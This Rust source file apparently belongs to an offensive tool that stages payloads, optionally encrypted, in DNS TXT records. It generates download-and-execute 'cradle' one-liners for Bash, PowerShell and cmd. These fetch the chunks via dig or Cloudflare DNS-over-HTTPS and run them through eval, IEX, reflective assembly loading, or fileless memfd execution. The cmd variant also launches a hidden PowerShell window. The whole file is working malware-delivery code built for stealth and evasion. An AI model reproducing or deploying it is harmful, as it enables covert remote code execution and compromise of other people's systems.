use crate::dns::{DnsBackend, DnsError};
use base64::Engine;
use serde::{Deserialize, Serialize};
use thiserror::Error;

const MAX_CHUNK_B64: usize = 1800;
const MAX_CHUNK_RAW: usize = MAX_CHUNK_B64 * 3 / 4;
const RECORD_TTL: u32 = 60;

#[derive(Error, Debug)]
pub enum CradleError {
    #[error("DNS error: {0}")]
    Dns(#[from] DnsError),
    #[error("payload too small ({0} bytes)")]
    EmptyPayload(usize),
    #[error("metadata not found for label '{0}'")]
    MetaNotFound(String),
    #[error("metadata parse error: {0}")]
    MetaParse(String),
    #[error("encryption error: {0}")]
    EncryptionError(String),
    #[error("{0}")]
    Other(String),
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum PayloadType {
    Script, Elf, Pe,
}

impl PayloadType {
    pub fn detect(data: &[u8]) -> Self {
        if data.len() >= 4 && &data[..4] == b"\x7fELF" { PayloadType::Elf }
        else if data.len() >= 2 && &data[..2] == b"MZ" { PayloadType::Pe }
        else { PayloadType::Script }
    }
}

impl std::fmt::Display for PayloadType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            PayloadType::Script => write!(f, "script"),
            PayloadType::Elf => write!(f, "elf"),
            PayloadType::Pe => write!(f, "pe"),
        }
    }
}

impl std::str::FromStr for PayloadType {
    type Err = String;
    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s.to_lowercase().as_str() {
            "script" => Ok(PayloadType::Script),
            "elf" => Ok(PayloadType::Elf),
            "pe" => Ok(PayloadType::Pe),
            _ => Err(format!("unknown payload type: {s}")),
        }
    }
}

#[derive(Debug, Serialize, Deserialize)]
pub struct StageMeta {
    pub chunks: usize,
    pub size: usize,
    #[serde(rename = "type")]
    pub payload_type: PayloadType,
    pub hash: String,
    /// Whether the staged data is encrypted (ChaCha20-Poly1305)
    #[serde(default)]
    pub encrypted: bool,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Shell { Bash, Pwsh, Cmd }

impl std::fmt::Display for Shell {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self { Shell::Bash => write!(f, "bash"), Shell::Pwsh => write!(f, "pwsh"), Shell::Cmd => write!(f, "cmd") }
    }
}

impl std::str::FromStr for Shell {
    type Err = String;
    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s.to_lowercase().as_str() {
            "bash" | "sh" => Ok(Shell::Bash),
            "pwsh" | "powershell" | "ps" | "ps1" => Ok(Shell::Pwsh),
            "cmd" => Ok(Shell::Cmd),
            _ => Err(format!("unknown shell: {s} (try: bash, pwsh, cmd)")),
        }
    }
}

/// Cradle transport method
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CradleTransport {
    /// Use dig (default, requires dig on target)
    Dig,
    /// Use DNS-over-HTTPS via curl (no dig required, encrypted DNS)
    DoH,
}

impl std::str::FromStr for CradleTransport {
    type Err = String;
    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s.to_lowercase().as_str() {
            "dig" | "dns" => Ok(CradleTransport::Dig),
            "doh" | "https" | "curl" => Ok(CradleTransport::DoH),
            _ => Err(format!("unknown transport: {s} (try: dig, doh)")),
        }
    }
}

fn meta_record_name(label: &str, domain: &str) -> String {
    format!("_s.meta.{label}.{domain}")
}

fn chunk_record_name(index: usize, label: &str, domain: &str) -> String {
    format!("_s.{index}.{label}.{domain}")
}

fn record_prefix(label: &str, domain: &str) -> String {
    format!("_s.{label}.{domain}")
}

/// Stage a payload into DNS TXT records, optionally encrypting it first
pub async fn stage_payload(
    backend: &dyn DnsBackend, domain: &str, label: &str, data: &[u8],
    payload_type: Option<PayloadType>,
) -> Result<StageMeta, CradleError> {
    stage_payload_encrypted(backend, domain, label, data, payload_type, None).await
}

/// Stage a payload with optional ChaCha20-Poly1305 encryption
pub async fn stage_payload_encrypted(
    backend: &dyn DnsBackend, domain: &str, label: &str, data: &[u8],
    payload_type: Option<PayloadType>,
    key: Option<&crate::crypto::EncryptionKey>,
) -> Result<StageMeta, CradleError> {
    if data.is_empty() { return Err(CradleError::EmptyPayload(0)); }

    let ptype = payload_type.unwrap_or_else(|| PayloadType::detect(data));
    let hash = blake3::hash(data).to_hex()[..32].to_string();

    // Optionally encrypt the payload before chunking
    let (staged_data, encrypted) = if let Some(k) = key {
        let encrypted_data = crate::crypto::encrypt(k, data)
            .map_err(|e| CradleError::EncryptionError(format!("{e}")))?;
        (encrypted_data, true)
    } else {
        (data.to_vec(), false)
    };

    let chunks: Vec<String> = staged_data.chunks(MAX_CHUNK_RAW)
        .map(|chunk| base64::engine::general_purpose::STANDARD.encode(chunk))
        .collect();

    let meta = StageMeta {
        chunks: chunks.len(),
        size: data.len(),
        payload_type: ptype,
        hash,
        encrypted,
    };

    let meta_name = meta_record_name(label, domain);
    let meta_json = serde_json::to_string(&meta).map_err(|e| CradleError::Other(e.to_string()))?;
    backend.create_record(&meta_name, &meta_json, RECORD_TTL).await?;

    let mut batch: Vec<(String, String)> = Vec::with_capacity(chunks.len());
    for (i, encoded) in chunks.iter().enumerate() {
        batch.push((chunk_record_name(i, label, domain), encoded.clone()));
    }
    let batch_refs: Vec<(&str, &str, u32)> = batch.iter()
        .map(|(name, content)| (name.as_str(), content.as_str(), RECORD_TTL)).collect();
    backend.batch_create(batch_refs).await?;

    Ok(meta)
}

pub async fn read_stage_meta(
    backend: &dyn DnsBackend, domain: &str, label: &str,
) -> Result<StageMeta, CradleError> {
    let name = meta_record_name(label, domain);
    let records = backend.get_records(&name).await?;
    let record = records.first().ok_or_else(|| CradleError::MetaNotFound(label.to_string()))?;
    let meta: StageMeta = serde_json::from_str(&record.content)
        .map_err(|e| CradleError::MetaParse(e.to_string()))?;
    Ok(meta)
}

pub async fn unstage_payload(
    backend: &dyn DnsBackend, domain: &str, label: &str,
) -> Result<usize, CradleError> {
    let prefix = record_prefix(label, domain);
    let meta_name = meta_record_name(label, domain);
    let mut deleted = 0;

    let meta_records = backend.get_records(&meta_name).await?;
    for r in &meta_records {
        if let Some(id) = &r.id { backend.delete_record(id).await?; deleted += 1; }
    }

    let all_records = backend.list_records(&prefix).await?;
    for r in &all_records {
        if let Some(id) = &r.id { backend.delete_record(id).await?; deleted += 1; }
    }

    Ok(deleted)
}

/// Generate a cradle one-liner for the given shell and transport
pub fn generate_cradle(
    shell: Shell, domain: &str, label: &str, meta: &StageMeta, ns_server: Option<&str>,
) -> String {
    generate_cradle_ext(shell, domain, label, meta, ns_server, CradleTransport::Dig, None)
}

/// Extended cradle generation with transport selection and optional decryption key
pub fn generate_cradle_ext(
    shell: Shell, domain: &str, label: &str, meta: &StageMeta,
    ns_server: Option<&str>, transport: CradleTransport, key_hex: Option<&str>,
) -> String {
    let n = meta.chunks - 1;
    let is_binary = matches!(meta.payload_type, PayloadType::Elf | PayloadType::Pe);
    match (shell, transport) {
        (Shell::Bash, CradleTransport::Dig) => gen_bash(domain, label, n, is_binary, ns_server, key_hex),
        (Shell::Bash, CradleTransport::DoH) => gen_bash_doh(domain, label, n, is_binary, key_hex),
        (Shell::Pwsh, _) => gen_pwsh(domain, label, n, is_binary, meta.payload_type, ns_server),
        (Shell::Cmd, _) => gen_cmd(domain, label, n, is_binary, meta.payload_type, ns_server),
    }
}

fn gen_bash(domain: &str, label: &str, max_idx: usize, is_binary: bool, ns: Option<&str>, key_hex: Option<&str>) -> String {
    let ns = ns.map(|s| format!(" @{s}")).unwrap_or_default();
    let fetch = format!("for i in $(seq 0 {max_idx});do dig +short TXT _s.$i.{label}.{domain}{ns}|tr -d '\"';done");

    let decrypt_step = if let Some(k) = key_hex {
        // Decrypt with openssl: nonce=first 12 bytes, data=rest
        format!(
            "|base64 -d|python3 -c \"import sys;d=sys.stdin.buffer.read();n=d[:12];c=d[12:];\
             from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305;\
             print(ChaCha20Poly1305(bytes.fromhex('{k}')).decrypt(n,c,None).decode(),end='')\""
        )
    } else {
        String::new()
    };

    if is_binary {
        if key_hex.is_some() {
            // Encrypted binary: decrypt then memfd exec
            let memfd = format!(
                "python3 -c \"import ctypes,os,sys;from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305;\
                 import base64;d=base64.b64decode('$({fetch})');n=d[:12];c=d[12:];\
                 b=ChaCha20Poly1305(bytes.fromhex('{k}')).decrypt(n,c,None);\
                 fd=ctypes.CDLL(None).memfd_create(b'x',1);os.write(fd,b);\
                 os.execve(f'/proc/self/fd/{{fd}}',['.'],dict(os.environ))\"",
                fetch = fetch,
                k = key_hex.unwrap(),
            );
            format!("# Encrypted fileless:\n{memfd}")
        } else {
            let memfd = format!(
                "python3 -c \"import ctypes,base64,os;b=base64.b64decode('$({fetch})');\
                 fd=ctypes.CDLL(None).memfd_create(b'x',1);os.write(fd,b);\
                 os.execve(f'/proc/self/fd/{{fd}}',['.'],dict(os.environ))\""
            );
            let shm = format!("{fetch}|base64 -d>/dev/shm/.x&&chmod +x /dev/shm/.x&&/dev/shm/.x;rm -f /dev/shm/.x");
            format!("# Fileless (python3):\n{memfd}\n\n# /dev/shm fallback:\n{shm}")
        }
    } else {
        if decrypt_step.is_empty() {
            format!("eval \"$({fetch}|base64 -d)\"")
        } else {
            format!("eval \"$({fetch}{decrypt_step})\"")
        }
    }
}

/// Generate a bash cradle that uses DNS-over-HTTPS via curl (no dig required)
fn gen_bash_doh(domain: &str, label: &str, max_idx: usize, is_binary: bool, key_hex: Option<&str>) -> String {
    // DoH via curl to Cloudflare's JSON API (simpler than wire format for shell)
    let fetch = format!(
        "for i in $(seq 0 {max_idx});do \
         curl -sH 'accept: application/dns-json' \
         'https://cloudflare-dns.com/dns-query?name=_s.'$i'.{label}.{domain}&type=TXT' \
         |python3 -c \"import sys,json;d=json.load(sys.stdin);print(d.get('Answer',[{{}}])[0].get('data','').strip('\\\"'),end='')\"; \
         done"
    );

    let decrypt_step = if let Some(k) = key_hex {
        format!(
            "|base64 -d|python3 -c \"import sys;d=sys.stdin.buffer.read();n=d[:12];c=d[12:];\
             from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305;\
             print(ChaCha20Poly1305(bytes.fromhex('{k}')).decrypt(n,c,None).decode(),end='')\""
        )
    } else {
        String::new()
    };

    if is_binary {
        if let Some(k) = key_hex {
            format!(
                "# DoH encrypted fileless:\n\
                 python3 -c \"import ctypes,os,json,urllib.request as u,base64;\
                 from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305;\
                 b64='';\n\
                 for i in range({n}):\n\
                  r=json.load(u.urlopen(u.Request(\
                  'https://cloudflare-dns.com/dns-query?name=_s.'+str(i)+'.{label}.{domain}&type=TXT',\
                  headers={{'accept':'application/dns-json'}})));\
                  b64+=r.get('Answer',[{{}}])[0].get('data','').strip('\\\"')\n\
                 d=base64.b64decode(b64);b=ChaCha20Poly1305(bytes.fromhex('{k}')).decrypt(d[:12],d[12:],None);\
                 fd=ctypes.CDLL(None).memfd_create(b'x',1);os.write(fd,b);\
                 os.execve(f'/proc/self/fd/{{fd}}',['.'],dict(os.environ))\"",
                n = max_idx + 1,
            )
        } else {
            format!(
                "# DoH fileless:\n\
                 python3 -c \"import ctypes,os,json,urllib.request as u,base64;\
                 b64='';\n\
                 for i in range({n}):\n\
                  r=json.load(u.urlopen(u.Request(\
                  'https://cloudflare-dns.com/dns-query?name=_s.'+str(i)+'.{label}.{domain}&type=TXT',\
                  headers={{'accept':'application/dns-json'}})));\
                  b64+=r.get('Answer',[{{}}])[0].get('data','').strip('\\\"')\n\
                 b=base64.b64decode(b64);\
                 fd=ctypes.CDLL(None).memfd_create(b'x',1);os.write(fd,b);\
                 os.execve(f'/proc/self/fd/{{fd}}',['.'],dict(os.environ))\"",
                n = max_idx + 1,
            )
        }
    } else {
        if decrypt_step.is_empty() {
            format!("eval \"$({fetch}|base64 -d)\"")
        } else {
            format!("eval \"$({fetch}{decrypt_step})\"")
        }
    }
}

fn gen_pwsh(domain: &str, label: &str, max_idx: usize, is_binary: bool, ptype: PayloadType, ns: Option<&str>) -> String {
    let ns_p = ns.map(|s| format!(" -Se {s}")).unwrap_or_default();
    let fetch = format!("-join(0..{max_idx}|%{{(Resolve-DnsName -Ty TXT -Na \"_s.$_.{label}.{domain}\"{ns_p}).Strings}})");

    if is_binary {
        match ptype {
            PayloadType::Pe => format!(
                "$b=[Convert]::FromBase64String({fetch});[Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,@(,@()))"
            ),
            _ => format!(
                "$b=[Convert]::FromBase64String({fetch});$f='/dev/shm/.x';[IO.File]::WriteAllBytes($f,$b);chmod +x $f;Start-Process $f -Wait;rm $f"
            ),
        }
    } else {
        format!("IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String({fetch})))")
    }
}

fn gen_cmd(domain: &str, label: &str, max_idx: usize, is_binary: bool, ptype: PayloadType, ns: Option<&str>) -> String {
    let inner = gen_pwsh(domain, label, max_idx, is_binary, ptype, ns);
    let escaped = inner.replace('"', "\\\"");
    format!("powershell -nop -w hidden -c \"{escaped}\"")
}
